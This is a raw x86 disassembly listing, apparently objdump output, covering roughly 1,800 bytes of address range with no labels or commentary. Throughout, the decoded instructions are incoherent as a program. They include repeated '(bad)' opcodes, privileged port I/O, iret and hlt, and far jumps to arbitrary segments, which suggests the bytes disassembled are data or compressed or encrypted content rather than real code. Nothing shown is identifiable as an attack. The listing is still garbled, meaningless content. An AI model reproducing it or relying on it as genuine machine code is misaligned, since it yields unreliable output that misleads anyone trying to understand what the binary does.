  41f352:	call   0x737e436a
  41f357:	aas    
  41f358:	fsubr  QWORD PTR [ecx+eax*1]
  41f35b:	js     0x41f320
  41f35d:	cmp    DWORD PTR [ecx-0x44],esp
  41f360:	dec    ecx
  41f361:	fistp  WORD PTR [ebx+0x20]
  41f364:	sub    eax,0xd198052e
  41f369:	or     eax,0x24bc23a0
  41f36e:	cld    
  41f36f:	or     eax,DWORD PTR [ebp-0x341080c9]
  41f375:	(bad)  
  41f377:	test   al,0x80
  41f379:	mov    edx,0x14686d66
  41f37e:	nop
  41f37f:	test   BYTE PTR ds:0x9307792,ch
  41f385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f386:	ja     0x41f405
  41f388:	jl     0x41f34d
  41f38a:	int3   
  41f38b:	outs   dx,DWORD PTR ds:[esi]
  41f38c:	stos   DWORD PTR es:[edi],eax
  41f38d:	mov    BYTE PTR [ecx-0xb],dl
  41f390:	jmp    0x65ec8139
  41f395:	int3   
  41f396:	or     al,0x91
  41f398:	lea    ecx,[esi+0x75]
  41f39b:	pop    eax
  41f39c:	adc    BYTE PTR [edx],dh
  41f39e:	mov    edi,0x3c8489ba
  41f3a3:	push   ecx
  41f3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3a5:	mov    ecx,0x78e942de
  41f3aa:	adc    DWORD PTR [edx+0x67e29d67],0x3d
  41f3b1:	sub    eax,0x9d64bb3
  41f3b6:	jg     0x41f3f9
  41f3b8:	sub    bh,BYTE PTR ss:[edi]
  41f3bb:	xchg   ebx,eax
  41f3bc:	and    eax,0xfd494dc3
  41f3c1:	lds    ebp,FWORD PTR [ebx]
  41f3c3:	sbb    eax,0xef6167c6
  41f3c8:	ret    
  41f3c9:	mov    ch,0xac
  41f3cb:	dec    esi
  41f3cc:	push   eax
  41f3cd:	jae    0x41f3d3
  41f3cf:	push   esp
  41f3d0:	pop    edx
  41f3d1:	nop
  41f3d2:	xor    al,bh
  41f3d4:	mov    bh,0x14
  41f3d6:	add    cl,al
  41f3d8:	pop    es
  41f3d9:	mov    esp,0x3009a54a
  41f3de:	dec    ecx
  41f3df:	mov    dh,0x25
  41f3e1:	outs   dx,BYTE PTR ds:[esi]
  41f3e2:	leave  
  41f3e3:	pop    ebp
  41f3e4:	pop    edi
  41f3e5:	jbe    0x41f429
  41f3e7:	lahf   
  41f3e8:	fcom   QWORD PTR [edi]
  41f3ea:	fs out 0x89,al
  41f3ed:	mov    al,0x2f
  41f3ef:	mov    WORD PTR ds:0x1096,?
  41f3f4:	arpl   WORD PTR [edi],cx
  41f3f6:	push   edx
  41f3f7:	fcomi  st,st(0)
  41f3f9:	mov    al,ds:0x16f5425f
  41f3fe:	cli    
  41f3ff:	(bad)  
  41f400:	mov    dl,dl
  41f402:	mov    esp,0x3a2e1dd4
  41f407:	fidivr WORD PTR [ebx]
  41f409:	iret   
  41f40a:	mov    cl,0x94
  41f40c:	loope  0x41f408
  41f40e:	mov    edx,DWORD PTR [eax-0x83b25ce]
  41f414:	retf   0x76b
  41f417:	inc    edx
  41f418:	sti    
  41f419:	inc    esp
  41f41a:	xchg   DWORD PTR [ecx-0x46ea62d6],esp
  41f420:	xor    eax,DWORD PTR [eax]
  41f422:	mov    cl,0xeb
  41f424:	adc    ah,BYTE PTR [edx-0x20]
  41f427:	(bad)  
  41f428:	xchg   edx,eax
  41f429:	mov    ch,cl
  41f42b:	popf   
  41f42c:	pop    esp
  41f42d:	xchg   ecx,eax
  41f42e:	adc    dh,dl
  41f430:	cmp    al,0xf8
  41f432:	inc    ebp
  41f433:	pop    esi
  41f434:	into   
  41f435:	stc    
  41f436:	sbb    cl,bh
  41f438:	js     0x41f3e4
  41f43a:	cmp    esp,DWORD PTR [esi+esi*2+0x727fc709]
  41f441:	inc    esi
  41f442:	and    dl,dh
  41f444:	(bad)  
  41f445:	out    0x54,eax
  41f447:	adc    BYTE PTR [ecx],bl
  41f449:	and    eax,0x454c4d52
  41f44e:	pop    edi
  41f44f:	inc    ebp
  41f450:	pop    ebx
  41f451:	pop    edi
  41f452:	shr    BYTE PTR [esi+0x27],0x49
  41f456:	je     0x41f451
  41f458:	in     al,0xc4
  41f45a:	fadd   DWORD PTR [ebx+0x6880001]
  41f460:	add    BYTE PTR [eax],al
  41f462:	stos   BYTE PTR es:[edi],al
  41f463:	mov    ebx,0xf71bb9b
  41f468:	loope  0x41f4cc
  41f46a:	mov    WORD PTR [ebx-0x3c487bb8],ds
  41f470:	sbb    BYTE PTR [edx],ch
  41f472:	(bad)
  41f476:	es pop ebp
  41f478:	ss xor ebx,esi
  41f47b:	cmc    
  41f47c:	loopne 0x41f4bd
  41f47e:	mov    al,ds:0xc6da9571
  41f483:	inc    esi
  41f484:	and    BYTE PTR [ebp-0x1d2c74a1],dl
  41f48a:	dec    ebp
  41f48b:	or     DWORD PTR [edi+edx*8+0x51],eax
  41f48f:	jo     0x41f42e
  41f491:	pop    ecx
  41f492:	pop    eax
  41f493:	enter  0x2bb1,0x6e
  41f497:	inc    BYTE PTR [ebp-0x194216ee]
  41f49d:	lea    ecx,[eax]
  41f49f:	lock lds esp,FWORD PTR [eax]
  41f4a2:	(bad)  
  41f4a4:	fild   DWORD PTR [ebp-0x2bd2541d]
  41f4aa:	daa    
  41f4ab:	jns    0x41f49b
  41f4ad:	xor    al,BYTE PTR [ebp-0x44]
  41f4b0:	loopne 0x41f437
  41f4b2:	jno    0x41f460
  41f4b4:	inc    ecx
  41f4b5:	pop    esp
  41f4b6:	loop   0x41f517
  41f4b8:	(bad)  
  41f4b9:	popf   
  41f4ba:	out    0x83,eax
  41f4bc:	enter  0xe039,0xa9
  41f4c0:	xchg   ebx,eax
  41f4c1:	dec    edx
  41f4c2:	jl     0x41f50f
  41f4c4:	jle    0x41f4cb
  41f4c6:	nop
  41f4c7:	mov    BYTE PTR [edx],dh
  41f4c9:	mov    al,0x6f
  41f4cb:	xor    DWORD PTR [edx+0x4f3ef923],esp
  41f4d1:	sub    eax,0xfb9febce
  41f4d6:	icebp  
  41f4d7:	mov    bl,0x16
  41f4d9:	(bad)  
  41f4da:	(bad)  
  41f4db:	mov    ch,0x8a
  41f4dd:	jo     0x41f527
  41f4df:	arpl   WORD PTR [edx],bx
  41f4e1:	inc    edx
  41f4e2:	jmp    0x80d:0x62593e20
  41f4e9:	pop    ds
  41f4ea:	pop    ecx
  41f4eb:	mov    ah,0x0
  41f4ed:	xchg   BYTE PTR [ebx-0x1],al
  41f4f0:	pop    eax
  41f4f1:	jle    0x41f55c
  41f4f3:	outs   dx,DWORD PTR ds:[esi]
  41f4f4:	leave  
  41f4f5:	and    BYTE PTR [esi+0x4d12b2d8],ah
  41f4fb:	jg     0x41f4e6
  41f4fd:	loopne 0x41f54e
  41f4ff:	test   BYTE PTR [ebp+edi*1-0x6b],ch
  41f503:	jl     0x41f4f9
  41f505:	clc    
  41f506:	xor    DWORD PTR [edi-0x6b],edi
  41f509:	sahf   
  41f50a:	(bad)  [ebx]
  41f50c:	add    DWORD PTR [edx],edi
  41f50e:	adc    BYTE PTR [eax-0x33],bh
  41f511:	pop    esi
  41f512:	jo     0x41f50b
  41f514:	pop    edi
  41f515:	test   DWORD PTR [esi],esp
  41f517:	retf   
  41f518:	rol    DWORD PTR [edi+0x7b],0x7
  41f51c:	pop    es
  41f51d:	in     al,0x76
  41f51f:	shl    DWORD PTR [esi+edi*8-0x7d],0x60
  41f524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f525:	loopne 0x41f4f2
  41f527:	push   esp
  41f528:	ss adc dh,cl
  41f52b:	iret   
  41f52c:	icebp  
  41f52d:	(bad)  
  41f52e:	pushf  
  41f52f:	js     0x41f53b
  41f531:	ror    ah,1
  41f533:	mov    edi,0xe099bde0
  41f538:	or     edi,ebx
  41f53a:	(bad)  
  41f53b:	push   0xb076c826
  41f540:	ror    dl,1
  41f542:	add    DWORD PTR [esi+0x6],0x4ce32daf
  41f549:	lds    esi,FWORD PTR [ebp+0x4a52ed82]
  41f54f:	cmp    eax,0x376a1b1e
  41f554:	sti    
  41f555:	cmc    
  41f556:	fsub   DWORD PTR [eax]
  41f558:	pop    eax
  41f559:	(bad)  
  41f55a:	push   edi
  41f55b:	addr16 popa 
  41f55d:	pusha  
  41f55e:	mov    bh,0x97
  41f560:	mov    al,0x18
  41f562:	mov    ebx,0x6196d16
  41f567:	or     eax,DWORD PTR ds:0xbda754af
  41f56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f56e:	clc    
  41f56f:	xor    BYTE PTR [ecx],al
  41f571:	cld    
  41f572:	inc    ebx
  41f573:	popf   
  41f574:	xor    DWORD PTR cs:[ebp-0x357ec2e8],eax
  41f57b:	lea    esi,[eax]
  41f57d:	push   ebp
  41f57e:	sub    cl,BYTE PTR [ebp+0x18460554]
  41f584:	hlt    
  41f585:	sti    
  41f586:	fmul   DWORD PTR [eax-0x64]
  41f589:	and    BYTE PTR [esi],ah
  41f58b:	test   DWORD PTR [ecx],ebp
  41f58d:	ret    
  41f58e:	jno    0x41f5d0
  41f590:	iret   
  41f591:	inc    edx
  41f592:	pop    ss
  41f593:	retf   
  41f594:	push   es
  41f595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f596:	mov    BYTE PTR ds:0x2269bf1f,al
  41f59c:	xchg   ebp,eax
  41f59d:	aas    
  41f59e:	retf   0x3283
  41f5a1:	gs popa 
  41f5a3:	into   
  41f5a4:	scas   al,BYTE PTR es:[edi]
  41f5a5:	add    DWORD PTR [ebp-0x2ce487d5],edi
  41f5ab:	xor    al,0xf8
  41f5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5ae:	into   
  41f5af:	and    al,0xf2
  41f5b1:	mov    cl,0x6
  41f5b3:	(bad)  
  41f5b4:	int    0x32
  41f5b6:	cmc    
  41f5b7:	mov    ?,WORD PTR [esi+0x45]
  41f5ba:	push   edi
  41f5bb:	or     al,0xcd
  41f5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5be:	add    dh,ch
  41f5c0:	stos   DWORD PTR es:[edi],eax
  41f5c1:	xchg   esi,eax
  41f5c2:	add    DWORD PTR [esi+ecx*1-0x29],ecx
  41f5c6:	test   esi,edx
  41f5c8:	sub    BYTE PTR [esi],0x4e
  41f5cb:	sbb    DWORD PTR [edi-0x6e],ebx
  41f5ce:	sub    edi,edi
  41f5d0:	mov    al,0xee
  41f5d2:	lea    esi,[ebp+0x4b93fc94]
  41f5d8:	mov    edx,0xdc6186bb
  41f5dd:	retf   0x843
  41f5e0:	retf   0x678f
  41f5e3:	pusha  
  41f5e4:	aas    
  41f5e5:	std    
  41f5e6:	jp     0x41f584
  41f5e8:	mov    al,bl
  41f5ea:	jbe    0x41f587
  41f5ec:	je     0x41f65a
  41f5ee:	shl    edx,1
  41f5f0:	xchg   ebp,esi
  41f5f2:	add    ch,BYTE PTR [edx+0x500896f2]
  41f5f8:	cmp    DWORD PTR [esi+0x2abeab45],ebp
  41f5fe:	add    bh,ch
  41f600:	mov    cs,WORD PTR [ecx]
  41f602:	pop    ebx
  41f603:	mov    bl,BYTE PTR [eax-0x42]
  41f606:	jbe    0x41f5db
  41f608:	add    ch,BYTE PTR [eax+0x6c]
  41f60b:	adc    esi,DWORD PTR [esi]
  41f60d:	xor    bl,BYTE PTR [edx-0x2f]
  41f610:	enter  0x2f66,0x8c
  41f614:	and    al,0x99
  41f616:	bound  ebx,QWORD PTR [ecx]
  41f618:	pop    ebx
  41f619:	jecxz  0x41f5bd
  41f61b:	aaa    
  41f61c:	xchg   edx,eax
  41f61d:	ret    0x75de
  41f620:	push   ebp
  41f621:	popa   
  41f622:	adc    DWORD PTR [eax],ebx
  41f624:	out    dx,al
  41f625:	addr16 jg 0x41f5bd
  41f628:	mov    edx,0x7a5f832
  41f62d:	arpl   WORD PTR [eax-0x3bf7cdab],sp
  41f633:	push   ss
  41f634:	test   DWORD PTR [edx],eax
  41f636:	jmp    0x41f640
  41f638:	xor    eax,0x1241006f
  41f63d:	aaa    
  41f63e:	adc    eax,0x11f94dfe
  41f643:	aad    0xf3
  41f645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f646:	xchg   esi,eax
  41f647:	int    0x6d
  41f649:	lock jl 0x41f6bc
  41f64c:	cmp    al,0x25
  41f64e:	ja     0x41f628
  41f650:	mov    ebx,0xc184a3bf
  41f655:	popf   
  41f656:	push   0x9b45c2e7
  41f65b:	shr    DWORD PTR [ebx+edi*4],1
  41f65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f65f:	out    0xe3,al
  41f661:	xchg   al,cl
  41f663:	jns    0x41f5ea
  41f665:	dec    edx
  41f666:	lahf   
  41f667:	popa   
  41f668:	pop    eax
  41f669:	mov    edi,0xc207891c
  41f66e:	leave  
  41f66f:	loope  0x41f65f
  41f671:	mov    ds:0xcad9b8a,eax
  41f676:	loopne 0x41f664
  41f678:	lods   al,BYTE PTR ds:[esi]
  41f679:	jle    0x41f6a4
  41f67b:	arpl   WORD PTR [esi-0x34],ax
  41f67e:	data16 mov al,ds:0x2fb7e64c
  41f684:	loope  0x41f668
  41f686:	push   ebx
  41f687:	mov    edx,0x4caf71f6
  41f68c:	(bad)  
  41f68d:	mov    ecx,0xea906f2a
  41f692:	and    BYTE PTR [edi],bl
  41f694:	push   edi
  41f695:	xchg   al,dl
  41f697:	out    0xdf,al
  41f699:	sbb    BYTE PTR [ecx+0x66],ah
  41f69c:	xor    al,0x6e
  41f69e:	push   cs
  41f69f:	xchg   al,al
  41f6a1:	ror    BYTE PTR [eax+eiz*8],cl
  41f6a4:	push   esi
  41f6a5:	mov    ds:0x756d7d17,al
  41f6aa:	jmp    0x6d8b:0x511b859c
  41f6b1:	(bad)  
  41f6b3:	cmp    esi,DWORD PTR [ebx]
  41f6b5:	xchg   ebx,eax
  41f6b6:	es dec eax
  41f6b8:	rcr    DWORD PTR es:[eax],cl
  41f6bb:	xor    al,0xb3
  41f6bd:	fs repz pop ds
  41f6c0:	jno    0x41f727
  41f6c2:	xchg   ebx,eax
  41f6c3:	sub    bh,cl
  41f6c5:	add    al,dh
  41f6c7:	in     al,dx
  41f6c8:	mov    ds,WORD PTR [ebp+esi*4-0x67100c]
  41f6cf:	in     al,0x6c
  41f6d1:	mov    eax,ds:0x597839a8
  41f6d6:	scas   eax,DWORD PTR es:[edi]
  41f6d7:	test   DWORD PTR ds:0x3ca83ad4,esp
  41f6dd:	mov    ecx,0xd23f0cf6
  41f6e2:	fbld   TBYTE PTR [edi-0x2a0facac]
  41f6e8:	cmp    al,0x60
  41f6ea:	push   es
  41f6eb:	mov    edx,0x8a8fd2b1
  41f6f0:	outs   dx,DWORD PTR ds:[esi]
  41f6f1:	ret    
  41f6f2:	in     al,0x93
  41f6f4:	push   esi
  41f6f5:	mov    ah,0xf1
  41f6f7:	xor    edi,DWORD PTR [edi]
  41f6f9:	mov    ch,0x66
  41f6fb:	push   esi
  41f6fc:	in     eax,dx
  41f6fd:	rol    BYTE PTR [eax],0xe0
  41f700:	test   eax,0xc8417746
  41f705:	dec    esi
  41f706:	jae    0x41f6b4
  41f708:	cld    
  41f709:	sbb    esp,edx
  41f70b:	add    DWORD PTR [ebx],esp
  41f70d:	repz xor al,0x3f
  41f711:	push   esi
  41f712:	adc    edi,esp
  41f714:	clc    
  41f715:	neg    BYTE PTR [edi]
  41f717:	sub    BYTE PTR [ebx],ch
  41f719:	add    DWORD PTR [edi-0x13],ebx
  41f71c:	pop    esp
  41f71d:	aas    
  41f71e:	hlt    
  41f71f:	mov    edx,0xf6e443f7
  41f724:	mul    BYTE PTR [ebx-0x7536c16b]
  41f72a:	mov    ecx,0x22dd1b45
  41f72f:	xchg   DWORD PTR [edx+0x22],esi
  41f732:	fistp  WORD PTR [esi-0x66]
  41f735:	xor    eax,0x59d64688
  41f73a:	lods   eax,DWORD PTR ds:[esi]
  41f73b:	push   esp
  41f73c:	xor    al,BYTE PTR [ebx-0x1]
  41f73f:	add    bl,BYTE PTR [edi-0xe]
  41f742:	lock add bh,BYTE PTR [ebp+0x4f657f7f]
  41f749:	jg     0x41f71d
  41f74b:	xchg   ebx,eax
  41f74c:	test   eax,0x9e6454cc
  41f751:	dec    edi
  41f752:	mov    WORD PTR [esi+ecx*1-0x9fa7719],cs
  41f759:	stos   DWORD PTR es:[edi],eax
  41f75a:	xchg   edi,eax
  41f75b:	ins    DWORD PTR es:[edi],dx
  41f75c:	das    
  41f75d:	shl    DWORD PTR [ecx],1
  41f75f:	jmp    0x41f7dc
  41f761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f762:	xchg   BYTE PTR [ebx],ch
  41f764:	iret   
  41f765:	dec    esp
  41f766:	fistp  DWORD PTR [ecx-0x3fdc30a0]
  41f76c:	mov    es,WORD PTR [esi]
  41f76e:	test   eax,0xebb0fbdc
  41f773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f774:	and    al,0x84
  41f776:	outs   dx,DWORD PTR ds:[esi]
  41f777:	dec    edi
  41f778:	push   cs
  41f779:	inc    esp
  41f77a:	or     eax,0xa46690f3
  41f77f:	and    eax,0x96a41672
  41f784:	mov    DWORD PTR ds:0xa91c53f0,ebx
  41f78a:	jb     0x41f76c
  41f78c:	pop    ecx
  41f78d:	int    0x95
  41f78f:	ret    0x1537
  41f792:	mov    DWORD PTR [eax+eiz*8-0x3d],ebx
  41f796:	dec    edx
  41f797:	cmc    
  41f798:	xchg   esi,eax
  41f799:	gs or  eax,0x30ca4eb
  41f79f:	xchg   BYTE PTR [edx-0x16],ah
  41f7a2:	xadd   DWORD PTR [edi+0x2f],eax
  41f7a6:	add    dl,dh
  41f7a8:	inc    esi
  41f7a9:	jbe    0x41f7a4
  41f7ab:	mov    esi,0xa1aef2e8
  41f7b0:	ror    cl,1
  41f7b2:	fmul   QWORD PTR [eax]
  41f7b4:	jb     0x41f78f
  41f7b6:	stc    
  41f7b7:	hlt    
  41f7b8:	cwde   
  41f7b9:	fidivr WORD PTR [eax-0x63]
  41f7bc:	stos   DWORD PTR es:[edi],eax
  41f7bd:	push   esi
  41f7be:	cmp    al,0xa5
  41f7c0:	and    cl,bh
  41f7c2:	or     bl,BYTE PTR [esi+0xa]
  41f7c5:	sub    eax,esp
  41f7c7:	mov    bh,0x19
  41f7c9:	imul   esi,eax,0x42
  41f7cc:	out    dx,eax
  41f7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ce:	(bad)  
  41f7cf:	xchg   edi,eax
  41f7d0:	xchg   ebp,eax
  41f7d1:	dec    edx
  41f7d2:	fwait
  41f7d3:	xlat   BYTE PTR ds:[ebx]
  41f7d4:	aam    0x18
  41f7d6:	push   eax
  41f7d7:	jno    0x41f75e
  41f7d9:	pusha  
  41f7da:	retf   
  41f7db:	cmp    al,0x4f
  41f7dd:	jnp    0x41f7ec
  41f7df:	add    DWORD PTR [edi],ebx
  41f7e1:	xchg   ebx,eax
  41f7e2:	inc    esi
  41f7e3:	push   0xdfa75fcb
  41f7e8:	cmp    BYTE PTR [ebx],ah
  41f7ea:	sti    
  41f7eb:	inc    esi
  41f7ec:	mov    ah,0xbd
  41f7ee:	adc    edi,eax
  41f7f0:	scas   al,BYTE PTR es:[edi]
  41f7f1:	cs mov dl,0x1e
  41f7f4:	cmc    
  41f7f5:	or     dh,dh
  41f7f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7f8:	aad    0xa6
  41f7fa:	loope  0x41f829
  41f7fc:	push   ebx
  41f7fd:	ins    BYTE PTR es:[edi],dx
  41f7fe:	test   al,0x6
  41f800:	sbb    BYTE PTR [ebx+0x18],ah
  41f803:	or     BYTE PTR [ecx+0x35098ba2],bl
  41f809:	add    al,0x32
  41f80b:	push   ss
  41f80c:	bound  ebx,QWORD PTR [edx]
  41f80e:	ret    0xb37a
  41f811:	repnz outs dx,DWORD PTR ds:[esi]
  41f813:	scas   al,BYTE PTR es:[edi]
  41f814:	not    BYTE PTR [esi+edx*1-0x62]
  41f818:	xchg   BYTE PTR [ecx-0x47],ah
  41f81b:	sub    edx,esp
  41f81d:	xor    ebx,DWORD PTR ds:0x5daf45be
  41f823:	jne    0x41f888
  41f825:	repz loopne 0x41f7e5
  41f828:	daa    
  41f829:	call   0x4af1:0xb7fd476c
  41f830:	xchg   edx,eax
  41f831:	sar    DWORD PTR [eax-0x30],cl
  41f834:	(bad)  
  41f835:	pop    ebx
  41f836:	int3   
  41f837:	rol    dh,cl
  41f839:	mov    DWORD PTR [ecx+0xac8d08c],ecx
  41f83f:	jmp    0x5d2e:0x3a09dc71
  41f846:	jge    0x41f876
  41f848:	mov    ds:0x497d351b,al
  41f84d:	ret    0x3ac4
  41f850:	jecxz  0x41f88e
  41f852:	or     cl,BYTE PTR [ebx+0x18]
  41f855:	fsubr  DWORD PTR [ecx-0x7]
  41f858:	mov    eax,0x288ede67
  41f85d:	scas   eax,DWORD PTR es:[edi]
  41f85e:	pop    esi
  41f85f:	bound  edi,QWORD PTR [edi-0x49]
  41f862:	popf   
  41f863:	inc    esi
  41f864:	out    dx,eax
  41f865:	dec    esp
  41f866:	aas    
  41f867:	test   al,0x36
  41f869:	repnz shl DWORD PTR [ecx+0x464b0c45],1
  41f870:	ds repnz sbb edx,eax
  41f874:	ins    BYTE PTR es:[edi],dx
  41f875:	pop    ss
  41f876:	or     al,0x3a
  41f878:	je     0x41f869
  41f87a:	adc    al,0x8b
  41f87c:	dec    edi
  41f87d:	fimul  DWORD PTR [esi+ebx*1+0x2c]
  41f881:	mov    ebp,0x599eaa17
  41f886:	dec    DWORD PTR [ebx-0x5bd4f732]
  41f88c:	push   ebx
  41f88d:	jge    0x41f84f
  41f88f:	mov    ss,WORD PTR [eax+0x7bb55d5e]
  41f895:	mov    eax,ds:0xf5d4ac4a
  41f89a:	mov    edi,0x68d501e
  41f89f:	(bad)  
  41f8a0:	outs   dx,DWORD PTR ds:[esi]
  41f8a1:	cmp    DWORD PTR [eax+0x1d],ebp
  41f8a4:	stos   BYTE PTR es:[edi],al
  41f8a5:	fistp  WORD PTR [ecx]
  41f8a7:	sbb    BYTE PTR [ebp+0x4631e6c9],0xd3
  41f8ae:	arpl   WORD PTR [esi+0x59],bp
  41f8b1:	xor    BYTE PTR [ebp-0x790bbbd1],0xaf
  41f8b8:	icebp  
  41f8b9:	das    
  41f8ba:	test   BYTE PTR ds:0x7734c161,cl
  41f8c0:	in     eax,dx
  41f8c1:	inc    eax
  41f8c2:	dec    esi
  41f8c3:	(bad)  
  41f8c4:	cmc    
  41f8c5:	je     0x41f861
  41f8c7:	dec    ecx
  41f8c8:	xor    al,0x49
  41f8ca:	pop    es
  41f8cb:	scas   al,BYTE PTR es:[edi]
  41f8cc:	arpl   WORD PTR [esi+ecx*4],di
  41f8cf:	cmp    esp,DWORD PTR [ebx]
  41f8d1:	mov    esp,0xa3f45124
  41f8d6:	pop    esp
  41f8d7:	(bad)  
  41f8d8:	push   cs
  41f8d9:	add    al,0x8e
  41f8db:	nop
  41f8dc:	(bad)  
  41f8dd:	cwde   
  41f8de:	stc    
  41f8df:	xchg   ebx,eax
  41f8e0:	test   BYTE PTR [eax+0x38],cl
  41f8e3:	xchg   ebp,eax
  41f8e4:	imul   ebp
  41f8e6:	xchg   ecx,eax
  41f8e7:	out    0x1,eax
  41f8e9:	xchg   DWORD PTR [edi-0x542642c2],ebx
  41f8ef:	pop    eax
  41f8f0:	cwde   
  41f8f1:	daa    
  41f8f2:	outs   dx,DWORD PTR ds:[esi]
  41f8f3:	pop    edi
  41f8f4:	rcl    edx,0x2b
  41f8f7:	test   BYTE PTR [ebx+0x7394f374],dl
  41f8fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8fe:	push   edx
  41f8ff:	add    edx,DWORD PTR ds:0x9fb9768b
  41f905:	jl     0x41f8d7
  41f907:	inc    edi
  41f908:	aas    
  41f909:	cmp    al,BYTE PTR [ebx]
  41f90b:	test   eax,0xcc49804f
  41f910:	int3   
  41f911:	iret   
  41f912:	fs (bad) 
  41f914:	cld    
  41f915:	cmp    BYTE PTR [ebx],0xd2
  41f918:	xchg   edx,eax
  41f919:	inc    edi
  41f91a:	shr    DWORD PTR [ecx-0x3684358d],cl
  41f920:	test   eax,0xff92272c
  41f925:	je     0x41f8ba
  41f927:	js     0x41f98e
  41f929:	mov    ebp,0x41cf1faa
  41f92e:	cld    
  41f92f:	cmp    dh,ah
  41f931:	adc    ecx,DWORD PTR [ecx-0x4679f682]
  41f937:	(bad)  
  41f938:	std    
  41f939:	cwde   
  41f93a:	sar    BYTE PTR [edx-0x407c636],cl
  41f940:	clc    
  41f941:	call   0x7816a8e7
  41f946:	jnp    0x41f8d1
  41f948:	scas   al,BYTE PTR es:[edi]
  41f949:	cmp    al,0x84
  41f94b:	add    esi,esi
  41f94d:	push   cs
  41f94e:	rcr    dh,1
  41f950:	push   0x14
  41f952:	(bad)  
  41f953:	shl    ebp,cl
  41f955:	ds inc eax
  41f957:	les    edx,FWORD PTR [ebx-0xe]
  41f95a:	ret    0xe936
  41f95d:	push   ds
  41f95e:	icebp  
  41f95f:	enter  0x94e7,0x8b
  41f963:	(bad)  
  41f964:	push   ss
  41f965:	iret   
  41f966:	pop    eax
  41f967:	push   0xa59a0c4b
  41f96c:	push   edi
  41f96d:	scas   eax,DWORD PTR es:[edi]
  41f96e:	mov    dh,0x2b
  41f970:	dec    ebx
  41f971:	mov    al,ds:0x78b95876
  41f976:	push   esp
  41f977:	or     al,0xf5
  41f979:	add    eax,DWORD PTR [edi]
  41f97b:	(bad)  
  41f97c:	jp     0x41f913
  41f97e:	xor    eax,0x8383657e
  41f983:	mov    edi,0xdfe4ccfe
  41f988:	mov    ah,0x50
  41f98a:	fadd   QWORD PTR [ebx+0x42]
  41f98d:	sub    BYTE PTR [ebx-0x4c],0x7c
  41f991:	retf   0x8ab1
  41f994:	cmp    DWORD PTR [eax],esp
  41f996:	in     al,dx
  41f997:	fs mov eax,0x54b837ad
  41f99d:	or     BYTE PTR [ecx-0x7c],bl
  41f9a0:	fmul   DWORD PTR [ecx]
  41f9a2:	pop    ebx
  41f9a3:	pop    es
  41f9a4:	orps   xmm6,xmm6
  41f9a7:	mov    edx,0xf48e2342
  41f9ac:	sbb    BYTE PTR [esi],cl
  41f9ae:	xor    BYTE PTR [ecx],bh
  41f9b0:	ret    0xb09c
  41f9b3:	dec    ebx
  41f9b4:	fild   DWORD PTR [esi+ebx*1]
  41f9b7:	sar    DWORD PTR [eax+edx*1-0x6bf54314],0xc8
  41f9bf:	push   es
  41f9c0:	add    al,bh
  41f9c2:	stos   BYTE PTR es:[edi],al
  41f9c3:	pusha  
  41f9c4:	imul   edx,DWORD PTR [esp+edx*1-0xe633840],0x6186eb45
  41f9cf:	cdq    
  41f9d0:	dec    sp
  41f9d2:	popa   
  41f9d3:	(bad)  
  41f9d4:	fisub  DWORD PTR [ebx-0x5e]
  41f9d7:	inc    edi
  41f9d8:	or     dl,cl
  41f9da:	jmp    0xf10def11
  41f9df:	sbb    ebx,DWORD PTR [edi*4-0x65549057]
  41f9e6:	movq   mm0,QWORD PTR [ebp+0x71]
  41f9ea:	out    0xcb,al
  41f9ec:	sar    edi,cl
  41f9ee:	xchg   esp,eax
  41f9ef:	push   ebx
  41f9f0:	push   eax
  41f9f1:	sub    bl,BYTE PTR [ecx-0xbb6a3ed]
  41f9f7:	leave  
  41f9f8:	add    cl,BYTE PTR [edx]
  41f9fa:	sub    DWORD PTR ds:0x9aefd117,ecx
  41fa00:	xor    eax,0x95e0d1a5
  41fa05:	or     eax,DWORD PTR [ecx-0x3c]
  41fa08:	(bad)  
  41fa09:	jns    0x41f9a9
  41fa0b:	out    dx,eax
  41fa0c:	call   0x98ac:0x7bb666de
  41fa13:	jle    0x41fa52
  41fa15:	mov    al,0xaa
  41fa17:	loop   0x41fa08
  41fa19:	add    BYTE PTR [ecx-0xf],ch
  41fa1c:	imul   edi,DWORD PTR [ecx-0x4e9f22f5],0xedeea369
  41fa26:	mov    ebx,0xd2a1e0a1
  41fa2b:	mov    cl,0xe7
  41fa2d:	cs xor eax,0x8af59135
  41fa33:	jbe    0x41f9e6
  41fa35:	test   BYTE PTR [ebx+0x6e2e2622],al
  41fa3b:	push   esp
  41fa3c:	shl    BYTE PTR [ecx-0x16ebc3fa],1
  41fa42:	inc    eax
  41fa43:	ja     0x41f9da
  41fa45:	cs stos BYTE PTR es:[edi],al
  41fa47:	cmp    cl,bh
  41fa49:	ins    BYTE PTR es:[edi],dx
  41fa4a:	xchg   ebx,eax
  41fa4b:	mov    bl,0xc1
  41fa4d:	xor    DWORD PTR [ecx+0x3304bb2e],edx
  41fa53:	out    dx,al
  41fa54:	inc    edi
  41fa55:	jecxz  0x41fab1
  41fa57:	mov    edi,0x667c76af
  41fa5c:	adc    edi,0xffffffc3
  41fa5f:	cli    
  41fa60:	push   ss
  41fa61:	xchg   ebp,eax
  41fa62:	xor    DWORD PTR [edx],eax
  41fa64:	stos   BYTE PTR es:[edi],al
  41fa65:	in     al,0xf
  41fa67:	xor    BYTE PTR [ecx-0x18],bh
  41fa6a:	stos   DWORD PTR es:[edi],eax
  41fa6b:	dec    eax
  41fa6c:	fld    TBYTE PTR [esi*1-0x65ae95ca]
  41fa73:	cmc    
  41fa74:	bound  eax,QWORD PTR [ebp-0x23bac27f]
  41fa7a:	pop    esp
  41fa7b:	mov    cs,eax
  41fa7d:	ret    0x33af
  41fa80:	cmc    
  41fa81:	js     0x41faef
  41fa83:	adc    al,0xa5
